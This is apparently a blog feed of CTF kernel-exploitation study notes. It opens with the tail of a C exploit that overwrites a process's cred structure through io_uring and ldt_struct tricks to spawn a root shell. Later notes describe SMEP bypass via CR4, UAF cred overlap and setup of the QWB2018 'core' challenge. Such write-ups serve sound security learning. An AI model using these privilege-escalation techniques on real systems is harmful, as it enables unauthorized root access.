class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        kill(processes[i], SIGCONT);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(wait(<span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_desc</span> <span class="hljs-title">desc</span>;</span><br>    <span class="hljs-keyword">size_t</span> leak_heap,cred;<br>    <span class="hljs-keyword">size_t</span> Data[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-built_in">memset</span>(Data,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(Data));<br>    <span class="hljs-built_in">memset</span>(&amp;desc,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(struct user_desc));<br>    <span class="hljs-keyword">char</span> leak[<span class="hljs-number">0x10</span>];<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br><br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    spawn_processes();<br><br><span class="hljs-comment">//1. leak heap addr</span><br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10) == context-&gt;cur-&gt;magic</span><br>    init_uring();<br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    syscall(SYS_modify_ldt, <span class="hljs-number">1</span>, &amp;desc, <span class="hljs-keyword">sizeof</span>(desc));<span class="hljs-comment">//write_ldt</span><br>    read(fd,leak,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//leak, 使用ldt_struct第一个指针(也是指向heap). </span><br>    leak_heap = *(<span class="hljs-keyword">size_t</span>*)leak;<br>    <span class="hljs-keyword">if</span>((!leak_heap))<br>        errExit(<span class="hljs-string">&quot;\033[31m[-] Could not leak heap_addr \033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] leak heap_addr: \033[0m0x%lx\n&quot;</span>, leak_heap);<br><br><span class="hljs-comment">//2. Find cred&#x27;struct by arbitrary address read </span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = leak_heap;<br>    register_tag(&amp;ring,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//kzalloc</span><br>    cred = find_cred(leak_heap);<br><br><span class="hljs-comment">//3. Overwrite uid and gid by Arbitrary address write</span><br>    close(fd);<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10)</span><br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    register_tag(&amp;ring1,Data,PAGESIZE/<span class="hljs-number">8</span> + <span class="hljs-number">1</span>);<span class="hljs-comment">//io_alloc_page_table</span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>;<br>    register_tag(&amp;ring2,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//tags[0] = cred+4</span><br>    Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4 = 0</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)&#123; <span class="hljs-comment">//overwrite two ids and groups</span><br>        Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>+<span class="hljs-number">8</span>*(i+<span class="hljs-number">1</span>);<br>        update_tag(&amp;ring2,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//tags[0] = cred+4+8*(i+1)</span><br>        Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4+8*(i+1) = 0</span><br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done \033[0m&quot;</span>);<br>    spawn_root_shell();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m[-] It should never be here \033[0m&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="idek2022"><a href="#idek2022" class="headerlink" title="idek2022"></a>idek2022</h1><h2 id="Coroutine"><a href="#Coroutine" class="headerlink" title="Coroutine"></a>Coroutine</h2><p>主要看<a href="https://kiprey.github.io/2023/01/idek_coroutine/">肖佬的wp</a>. 做一点个人补充. </p><p>什么是协程: <a href="https://lewissbaker.github.io/2017/11/17/understanding-operator-co-await">比较全的英文blog</a> | <a href="https://zhuanlan.zhihu.com/p/497224333">CSDN官方文章</a> : 后者的例子中并没有<code>.resume</code>操作, 直接sleep代替了, 不太完善. </p><p><a href="https://devblogs.microsoft.com/oldnewthing/20210329-00/?p=105015">非常全的 MS blog</a> </p><ul><li><code>co_await co_yield co_return</code> 有一个关键字该函数就算是协程. </li><li><code>struct promise_type</code>用于定义一类协程的行为, 编译器还会把coroutine_handle紧挨着promise_type一起放在协程栈帧的开头. </li><li>而跟在<code>co_wait</code>后的是一个struct, 定义了 await_ready、await_suspend 和 await_resume 方法的类型. </li><li><code>co_wait</code>展开后是如下红色区域, 在主线程创建新线程后, 满足一定条件时会返回caller, 当可以继续执行时在主线程执行<code>handle.resume()</code>, 子线程就会继续执行协程中剩余代码. 一个<a href="https://godbolt.org/z/nbM5YcWeT">代码例子</a>. </li></ul><img src="https://s2.loli.net/2023/02/16/LJGcbS9DlR5IadH.jpg" alt="img" style="zoom:50%;" /><p>尝试复现中遇到一点小问题:</p><ul><li>代码例子中编译选项要加上-fcoroutines. </li><li>vscode无法识别coroutine, 要在C++ Intellisense-&gt;Cpp standard选择C++20. </li><li>一看代码没发现bind, 结果是直接使用默认port, 然后stdout传给py脚本, 再用socat来export特定端口(12345). </li><li>复习了std::span和std::optional. </li><li><code>final_suspend()</code>在cppref都搜不到怎么suspend. 还得看MS的文章. </li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF零散的知识点</title>
    <link href="/2022-07/Now-CTF-supplement/"/>
    <url>/2022-07/Now-CTF-supplement/</url>
    
    <content type="html"><![CDATA[<p>这个写的挺糟糕的, 只有ret2dlresolve能看一看. kernel pwn的部分直接看<a href="../pwn_new/pwn_kernel_basic.md">另外一篇</a>. </p><ul><li><a href="https://ccap.udel.edu/2021/10/20/ctf/">CTF types</a> : Jeopardy, Attack-Defence and mixed.</li><li>eehhhhhh, 完全不知道CTFtimes怎么用… 现在大概知道了</li></ul><h2 id="a-new-start-from-SCTF-flying-kernel"><a href="#a-new-start-from-SCTF-flying-kernel" class="headerlink" title="a new start from SCTF-flying_kernel"></a>a new start from SCTF-flying_kernel</h2><p>the following is a few concepts.</p><p><img src="../../image/CTF_newly_start/image-20220710173158610.png" alt="image-20220710173158610"></p><blockquote><p><em><strong>What is the <code>-initrd</code> in qemu command line used for?</strong></em> </p><p>It is used to init RAM disk, which utilize RAM with a drive to act like an SSD disk.</p><p>And look this <a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">answer</a> </p></blockquote><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>review the concepts of docker.</p><img src="../../image/CTF_newly_start/architecture.svg" alt="Docker Architecture Diagram" style="zoom:80%;" /><p><del>Docker Desktop needs Ubuntu 22.04…. a new VM.</del> Okay, left the Docker Destkop away. </p><p>details are written in <em>linux relative hints</em> </p><h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>run <code>kvm-ok</code> in kali shows NOT SUPPORT at first, then i try to update the VM hardware compatibility in vmware, now it works. </p><p>the flying-kernel is using qemu in the container, but i find that there is a <code>-cpu kvm64, +semp</code> argument. It means a processor with kvm enabled. and when i search on google it says qemu may utilize the kvm to accelerate itself. </p><blockquote><h3 id="VMWare"><a href="#VMWare" class="headerlink" title="VMWare"></a>VMWare</h3><p>it relies on software to simulate hardware functionality and create a virtual compoter system.</p></blockquote><h3 id="SMP"><a href="#SMP" class="headerlink" title="SMP"></a>SMP</h3><blockquote><p><em>from wikipedia</em>.</p></blockquote><p><strong>Symmetric multiprocessing</strong> or <strong>shared-memory multiprocessing</strong> (<strong>SMP</strong>) involves a multiprocessor computer hardware and software architecture where two or more identical processors are connected to a single, shared main memory, have full access to all input and output devices, and are controlled by a single operating system instance that treats all processors equally, reserving none for special purposes. </p><h3 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h3><p>SMEP and SMAP.</p><p><a href="https://wiki.osdev.org/Supervisor_Memory_Protection">https://wiki.osdev.org/Supervisor_Memory_Protection</a></p><h3 id="xinetd"><a href="#xinetd" class="headerlink" title="xinetd"></a>xinetd</h3><p><a href="https://en.wikipedia.org/wiki/Xinetd">wiki</a> | <a href="https://linux.die.net/man/5/xinetd.conf">.conf man page</a>   </p><h3 id="Kernel-Module"><a href="#Kernel-Module" class="headerlink" title="Kernel Module"></a>Kernel Module</h3><ul><li><code>modinfo</code> <code>modprobe</code>(intelligently add or remove modules) <code>mknod</code> </li><li>modules are object files whose symbols get resolved <strong>upon running insmod or modprobe</strong>.</li><li>Arguments (a <a href="https://www.linux.com/training-tutorials/kernel-newbie-corner-everything-you-wanted-know-about-module-parameters/">post</a>) <ul><li><code>module_param(var, int, 0644)</code> can take the arguments(<code>var</code>) passed by <code>insmod xxx var=5</code> to a Module with permissions(<code>0644</code>).<br>or <code>module_param(mylong, long, S_IRUSR)</code> </li><li><code>MODULE_PARM_DESC()</code> used to document argument that the module can take. Will show in the <code>modinfo xx.ko</code>. </li></ul></li><li>device driver: <ul><li><code>ll /dev</code> =&gt; <code>crw-rw---- 1 root dial 4, 67 Jul 5 2000 /dev/ttyS3</code><br>c -&gt; character device, 4 -&gt; major number, 67 -&gt; minor number.  Major number <a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/Documentation/admin-guide/devices.txt">assigned list</a> </li></ul></li><li><code>/proc file system</code>: Originally designed to allow easy access to information about processes (hence the name), it is now used by every bit of the kernel which has something interesting to report<ul><li>use <code>/proc file system</code> to get module info in user-land program. such as <code>proc_create()</code> <code>proc_remove()</code> functions.</li></ul></li><li><code>class_create()</code> A class is a higher-level view of a device that abstracts out low-level implementation details.<br><a href="F:\linux-5.18.11\include\linux\device\class.h">header file</a> </li><li>to be continued…</li></ul><h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul><li><a href="https://www.sudo.ws/docs/man/sudoers.man/"><code>sudoers</code></a> — default sudo security policy plugin </li></ul><h2 id="flying-kernel"><a href="#flying-kernel" class="headerlink" title="flying-kernel"></a><del>flying-kernel</del></h2><p>很好, 又发现他用的是字符设备的kernel module, 继续看kernel module文档(在上面).</p><blockquote><p><a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II">代佬博客总结</a> </p></blockquote><p>现在又发现CTF-wiki上有内核的知识, 一大堆东西接着pwn.college后面, 所以还得先学掉那些东西…. 不然什么smap smep保护都不知道怎么用. (<del>还有我怎么看到UAF一点都不敏感.</del>)</p><p>smap明明在pwn.college上见到过了, 看来过一遍概念还是没法留下深刻的印象, 之前的再复习复习.</p><h2 id="Kernel-Mode"><a href="#Kernel-Mode" class="headerlink" title="Kernel Mode"></a>Kernel Mode</h2><ul><li><a href="https://en.wikipedia.org/wiki/Read-copy-update">Read-copy-update</a> : RCU <ul><li>in kernel code may use <code>__rcu</code> before variable to indicate the use of RCU.</li></ul></li><li>kallsym file info type: <a href="https://developer.aliyun.com/article/53679">link</a> </li></ul><h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><h4 id="change-self-改变自身权限"><a href="#change-self-改变自身权限" class="headerlink" title="change self: 改变自身权限."></a>change self: 改变自身权限.</h4><ul><li>task_struct and cred and other pointers utilization.</li></ul><h4 id="change-others-改变高权限进程的控制流"><a href="#change-others-改变高权限进程的控制流" class="headerlink" title="change others: 改变高权限进程的控制流."></a>change others: 改变高权限进程的控制流.</h4><p><strong>CHANGE DATA</strong> :</p><ul><li><p><code>call_usermodehelper</code> 只能说是告诉了我有这么一种方式, 但是更具体的细节还得搜其他的东西.<br><a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/">post</a> | <a href="https://www.anquanke.com/post/id/236126">another post with several exp.</a> </p></li><li><p><code>poweroff_cmd</code> when exec <code>init</code> or <code>poweroff</code> command in shell. </p></li></ul><p><strong>CHANGE CODE</strong> : </p><ul><li>revise code in <strong>vDSO</strong>(virtual dynamic shared object).</li></ul><blockquote><p><em><strong>in Linux man page</strong></em>: </p><p> The “vDSO” (virtual dynamic shared object) is a small shared library that the kernel automatically maps into the address space of all user-space applications.</p></blockquote><p>locate vDSO:</p><ul><li>in IDA: first find <code>init_vdso()</code>, then click <code>vsdo_image_64</code> variable, and then we can find the address of raw_data, which can be used to address the true vDSO.</li><li>in Memory: <ul><li>directly: vDSO is in fact a ELF file. we can locate the function name string in memory to figure out the address of vDSO.</li><li>indrectly: the vDSO is at a constant offset from kernel base.</li></ul></li></ul><h3 id="Information-disclosure-amp-DoS"><a href="#Information-disclosure-amp-DoS" class="headerlink" title="Information disclosure &amp; DoS"></a>Information disclosure &amp; DoS</h3><h3 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h3><h4 id="SMEP-amp-SMAP"><a href="#SMEP-amp-SMAP" class="headerlink" title="SMEP &amp; SMAP"></a>SMEP &amp; SMAP</h4><h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><p>默认情况下，SMEP 保护是开启的。</p><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>+smep</code> 来开启 SMEP。</p><h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><p>在 <code>/etc/default/grub</code> 的如下两行中添加 nosmep</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;quiet&quot;</span>  <br><span class="hljs-attr">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;initrd=/install/initrd.gz&quot;</span><br></code></pre></div></td></tr></table></figure><p>然后运行 <code>update-grub</code> 并且重启系统就可以关闭 smep。</p><blockquote><p><em><strong>What is GRUB(Grand Unified Bootloader)?</strong></em> </p><p>GRUB is the default bootloader for many of the Linux distributions. </p><p>-&gt; <a href="https://opensource.com/article/17/3/introduction-grub2-configuration-linux">more details</a> &lt;- </p></blockquote><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nosmep</code> 来关闭 SMEP。</p><h5 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h5><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> smep <span class="hljs-regexp">/proc/</span>cpuinfo<br></code></pre></div></td></tr></table></figure><h5 id="Attack-SMEP"><a href="#Attack-SMEP" class="headerlink" title="Attack SMEP"></a>Attack SMEP</h5><p>把 <code>CR4</code> 寄存器中的第 20 位 置为 0 后，我们就可以执行用户态的代码。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。 </p><p>内核中修改 cr4 的代码最终会调用到 <code>native_write_cr4</code>，当我们能够劫持控制流后，我们可以执行内核中的 gadget 来修改 CR4。从另外一个维度来看，内核中存在固定的修改 cr4 的代码，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。</p><p><code>copy_from/to_user</code> : 在劫持控制流后，攻击者可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志。</p><h4 id="KPTI-Kernel-Page-Table-Isolation-¶"><a href="#KPTI-Kernel-Page-Table-Isolation-¶" class="headerlink" title="KPTI - Kernel Page Table Isolation ¶"></a>KPTI - Kernel Page Table Isolation <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/kpti/#_4">¶</a></h4><p>utilization method</p><h4 id="Internal-Isolation-WiKi"><a href="#Internal-Isolation-WiKi" class="headerlink" title="Internal Isolation WiKi"></a>Internal Isolation <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/inner-kernel/heap-chunk/">WiKi</a></h4><ul><li>Key: <strong>a cache with SLAB_ACCOUNT <u>cannot</u> be merged with a cache w/o SLAB_ACCOUNT</strong>, that is, used for dedicated purpose.</li></ul><blockquote><p>__GFP_ACCOUNT: <a href="https://www.kernel.org/doc/html/v5.8/core-api/memory-allocation.html#:~:text=Untrusted%20allocations%20triggered%20from%20userspace">Kernel doc</a> (GFP -&gt; Get Free Pages)</p><ul><li>Untrusted allocations triggered from userspace should be a subject of kmem accounting and must have <code>__GFP_ACCOUNT</code> bit set. There is the handy <code>GFP_KERNEL_ACCOUNT</code> shortcut for <code>GFP_KERNEL</code> allocations that should be accounted.</li></ul></blockquote><blockquote><p><em><strong>memcg(memory cgroup) &amp; cgroups</strong></em>: <a href="https://www.ibm.com/docs/en/spectrum-symphony/7.3.0?topic=limits-control-groups-cgroups-limiting-resource-usage-linux">IBM doc</a> </p><p>The memory subsystem of the cgroups feature <strong>isolates the memory behavior of a group of processes (tasks) from the rest of the system</strong>. It reports on memory resources used by the processes in a cgroup, and sets limits on memory used by those processes.</p></blockquote><blockquote><p><code>kmem-cache-create()</code>: <a href="https://docs.oracle.com/cd/E86824_01/html/E54779/kmem-cache-create-9f.html">link</a> </p><p><em><strong>What is cache in Linux?</strong></em> </p><p>… not clear, only know that it is used by <code>kmem_cache_create</code>. </p><p><em><strong>What functions use this feature?</strong></em> </p><p><code>kmem_cache_create()</code> <code>kmem_cache_alloc()</code> </p><p>It will allocate objects from a dedicated <strong>slab</strong> cache created by <code>kmem_cache_create</code>. If you specifically want a better slab cache management dedicated to your module only, use <code>kmem_cache_create</code> followed by <code>kmem_cache_alloc</code>. USB/SCSI drivers use this. <code>kmem_cache_create</code> takes sizeof your object you want to create slab of, a name which appears in /proc/slabinfo and flags to govern behavior of your slab cache.</p><blockquote><p><code>kmalloc()</code> malloc an aligned space, start from 32 bytes. -&gt; <a href="https://elixir.bootlin.com/linux/v3.9.11/source/mm/slab.c#L325">src is here</a> &lt;- | -&gt; <a href="https://www.kernel.org/doc/html/latest/core-api/memory-allocation.html#:~:text=The%20maximal%20size%20of%20a%20chunk%20that%20can%20be%20allocated%20with%20kmalloc%20is%20limited.%20The%20actual%20limit%20depends%20on%20the%20hardware%20and%20the%20kernel%20configuration%2C%20but%20it%20is%20a%20good%20practice%20to%20use%20kmalloc%20for%20objects%20smaller%20than%20page%20size.">doc is here</a> &lt;-</p></blockquote></blockquote><p>有关于kmalloc记录在另外一篇. </p><h3 id="Info-Disclosure-WiKi"><a href="#Info-Disclosure-WiKi" class="headerlink" title="Info Disclosure WiKi"></a>Info Disclosure <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/">WiKi</a></h3><p>dmesg_restrict | kptr_restrict</p><h3 id="Randomization"><a href="#Randomization" class="headerlink" title="Randomization"></a>Randomization</h3><p>KASLR</p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/">FG-KASLR</a> : 主要是在FG-KASLR的环境下还有哪些可利用的地方.</p><h3 id="kernel-UAF¶"><a href="#kernel-UAF¶" class="headerlink" title="kernel UAF¶"></a>kernel UAF<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/#kernel-uaf">¶</a></h3><p>主要是内核中内存分配管理的利用, 即普通堆块释放后被cred结构体的malloc分配(因为大小一致), 然后使用另一程序对原指针的操作修改cred为root权限. 这个内存管理特性和上面的linux cache有关系.</p><p>那么根据 UAF 的思想，思路如下：</p><ol><li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li><li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li><li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li></ol><h3 id="Kernel-ROP-amp-过程示例"><a href="#Kernel-ROP-amp-过程示例" class="headerlink" title="Kernel ROP &amp; 过程示例"></a>Kernel ROP &amp; 过程示例</h3><blockquote><p><strong>强网杯2018-pwn-kernel-core</strong> </p><p>看到skr师傅早在18年的wp, 一步一步来很详细, 参考见-&gt;<a href="https://eternalsakura13.com/2018/03/31/b_core/">这里</a>, WiKi上也有相应内容. 我自己试一试.</p></blockquote><ul><li>extract <code>vmlinux</code> from command line. <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">script</a> </li><li>ROP <a href="https://github.com/sashs/Ropper">searcher</a> </li></ul><p>首先下载.tar文件, 然后解压:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">pc wget &quot;https://github.com/eternalsakura/ctf_pwn/raw/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar&quot;<br>ll<br><br>┌──(root💀kali)-[/mnt/hgfs/LearingList/CTF/QWB-core]<br>└─# ll<br>total 46653<br>-rwxrwxrwx 1 root root  7029056 Mar 23  2018 bzImage<br>drwxrwxrwx 1 root root     4096 Jul 16 20:39 core<br>-rwxrwxrwx 1 root root      233 Jul 16 20:25 start.sh<br>-rwxrwxrwx 1 root root 40738712 Mar 24  2018 vmlinux<br></code></pre></div></td></tr></table></figure><p>core是使用<code>cpio -idm &lt; core.cpio</code>命令extract之后的文件夹, 并没有重命名之后再使用gunzip, 嗯, 我也不知道为什么, 反而用那种方法gunzip会告诉我无法识别文件格式. </p><p>start.sh:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta">#</span><span class="bash"> line 7 kaslr can be removed when debugging.</span><br>qemu-system-x86_64 \<br>-m 128M\<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \ #boot config.<br>-s  \ #means open a gdbserver on TCP port 1234 at default.<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><p>.cpio中包含以下文件:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">┌──(root💀kali)-[/mnt/…/LearingList/CTF/QWB-core/core]<br>└─# l <br>bin/  core.cpio*  core.ko*  etc/  gen_cpio.sh*  init*  lib/  lib64/  proc/  root/  sbin/  sys/  tmp/  usr/  vmlinux*<br></code></pre></div></td></tr></table></figure><p><strong>core.ko</strong> is kernel module, <strong>gen_cpio.sh</strong> can be used to regenerate the archive after revision. <strong>vmlinux</strong> is the kernel image. <strong>init</strong> is (????) init file. <del>but i dont know when it will be executed.</del>  </p><p>注意如果要编译内核模块则需要内核源码, 使用make命令来编译, 但是实际上并不需要这么做. </p><p>init file:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms    # notice this line. I can get ksyms address from here.<br>echo 1 &gt; /proc/sys/kernel/kptr_restrict<br>echo 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2.<br>insmod /core.ko<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">poweroff -d 120 -f &amp;       <span class="hljs-comment"># comment this line to disable auto timer shutdown</span></span><br>                         # but i dont know how that happends, it only show `Too many arguments`<br>                         # on my kali linux 2022.2<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br>echo &#x27;sh end!\n&#x27;<br>umount /proc<br>umount /sys<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">poweroff -d 0  -f</span><br></code></pre></div></td></tr></table></figure><blockquote><p>居然手贱在主机里执行了init, 给我执行了一堆奇怪命令….我还没弄快照…..还好没啥事.</p><p>现在修改init文件, 重新打包后运行系统直接init执行错误. 真是神奇啊.</p><p>总不能是权限问题吧…. 从各种意义上来说, 这很离谱.</p><p>突然又成功了, 玄学的环境.. 哦我知道为什么了:</p></blockquote><p><strong>在共享文件夹下无法创建符号链接</strong>, 所以重新打包之前/bin下面没有busybox的配置. 直接移至/root下.</p><p>然后是core.ko.</p><p>init_module:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 <span class="hljs-title">init_module</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  core_proc = proc_create(<span class="hljs-string">&quot;core&quot;</span>, <span class="hljs-number">438LL</span>, <span class="hljs-number">0LL</span>, &amp;core_fops); <span class="hljs-comment">//简单的创建proc文件</span><br>  printk(&amp;unk_2DE);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>read:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 